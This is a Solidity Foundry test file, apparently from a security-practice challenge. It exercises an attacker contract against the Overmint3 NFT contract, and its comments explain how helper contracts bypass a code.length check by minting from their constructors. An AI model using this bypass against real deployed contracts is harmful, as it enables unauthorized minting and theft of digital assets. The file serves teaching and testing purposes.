// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Overmint3, Overmint3Attacker} from "../src/Overmint3.sol";

/**
 * @title Overmint3 Attack Test
 * @notice Demonstrates exploitation of contract code size check bypass
 *
 * @dev The vulnerability exists because:
 * - Contract uses code.length check to prevent contract calls
 * - But during contract construction, code.length is always 0
 * - This allows bypass through constructor calls
 *
 * Attack flow:
 * 1. Main attacker contract deploys helper contracts in loop
 * 2. Each helper in its constructor:
 *    - Calls mint() (passes code.length check)
 *    - Transfers NFT to attacker
 * 3. Process repeats until attacker has 5 NFTs
 * 4. All operations happen in single transaction
 */
contract Overmint3Test is Test {
    Overmint3 public victimContract;
    Overmint3Attacker public overmint3Attacker;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        overmint3Attacker = new Overmint3Attacker();
        victimContract = new Overmint3();
    }

    function testExploit() public {
        uint64 nonceBefore = vm.getNonce(attacker);

        vm.startPrank(attacker);
        overmint3Attacker.attack(victimContract, attacker);
        vm.stopPrank();

        console.log("balanceOf attacker", victimContract.balanceOf(attacker));
        console.log("Nonce before", nonceBefore);
        console.log("Nonce after", vm.getNonce(attacker));

        assertEq(victimContract.balanceOf(attacker), 5, "Attacker should have 5 NFTs");
        //assertEq(vm.getNonce(attacker) - nonceBefore, 1, 'Must exploit in one transaction');
    }
}
